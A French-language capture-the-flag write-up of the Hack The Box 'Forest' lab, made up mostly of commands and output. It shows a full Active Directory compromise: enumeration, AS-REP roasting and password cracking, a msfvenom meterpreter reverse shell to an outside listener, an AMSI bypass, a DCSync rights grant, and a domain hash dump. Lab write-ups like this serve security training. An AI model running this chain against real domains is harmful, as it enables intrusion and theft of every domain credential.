# Forest 
```shell
nmap -sV 10.10.10.161
	Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-23 08:46 GMT
	Nmap scan report for 10.10.10.161
	Host is up (0.027s latency).
	Not shown: 990 closed tcp ports (conn-refused)
	PORT     STATE SERVICE      VERSION
	88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-23 08:53:15Z)
	135/tcp  open  msrpc        Microsoft Windows RPC
	139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
	389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
	445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
	464/tcp  open  kpasswd5?
	593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
	636/tcp  open  tcpwrapped
	3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
	3269/tcp open  tcpwrapped
	Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

# on a domain htb.local, on try anonymous enum 
enum4linux -U 10.10.10.161  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
# on find plusieurs user on va try password spraying 
sebastien
lucinda
svc-alfresco
andy
mark
santi
```
> Finalement on try kerberoasting ou asproasting et le deuxieme fonctionne 
```shell
GetNPUsers.py htb.local/svc-alfresco -no-pass -dc-ip 10.10.10.161
# on crack password offline 
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt 
	$krb5asrep$23$svc-alfresco@HTB.LOCAL:aaef17eac299aa039e3f18a8ad8f48d1$a968b88d9b5c7de0e6185b5cac854d04ae518f1e29beee218afe95134b2bfe23b06bd2383c3c22f9a6390995e9c6570258cf95a1e35b80ef6f3c89ad4b41fb97b56d4da60fb084f265652629a06622b03b48f13176a640c0e1b4a675cd64daa47aa7ca2aafcb37bfe1fa1023ddb32db532024ba17eaa00016931191abfe1f00aeb7b3409e8da2767b6a68f34ab3e20fab2bb5bca6057bd3cf2aa3fef596178b26c23395a018244d35b63735eec82f3137d80080743ea7aadc943acf3a7bd78744465b581647a4130751be952e9151dfb23e50aecece9c722fd88e8b7b0b750115c75fb53294c:s3rvice
# on a foothold sur domain
# connexion smb marche pas on test others protocoles 
cme winrm 10.10.10.161 -u svc-alfresco -p 's3rvice' -x 'whoami'
# on a retour de la cmd on use evil-winrm pour avoir shell 
# on va upload meterpreter pour dump amdin hash et faire PTH 
evil-winrm -u svc-alfresco -p "s3rvice" -i 10.10.10.161
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.30 LPORT=4444 -f exe > shell.exe
> upload shell.exe
# on met handler puis 
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> .\shell.exe
# on check groupe de luser, il appartient a Account operator
# on upload sharpound puis on le lance sur target 
.\SharpHound.exe -c all
# get zip 
download "C:/Users/svc-alfresco/Desktop/20240123021730_BloodHound.zip"
# on charge le tout dans bloodhound
# on voit que lon a write acl sur domain on va add dcsync right a user svc-alfresco
*Evil-WinRM* PS C:\Users\svc-alfresco> Bypass-4MSI
# on add dabord au groupe exchange windows permission 
net group “Exchange Windows Permissions” svc-alfresco /add
# ensuite add dcsync depuis windows 
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPassword)
# il faut charger evil-winrm avec path to script powerview, il est dans dossier courant apres lavoir mis 
evil-winrm -u svc-alfresco -p "s3rvice" -i 10.10.10.161 -s .

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Bypass-4MSI

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync
# ensuite dcsync 
secretsdump.py -just-dc "htb.local"/"svc-alfresco"@"10.10.10.161"
```
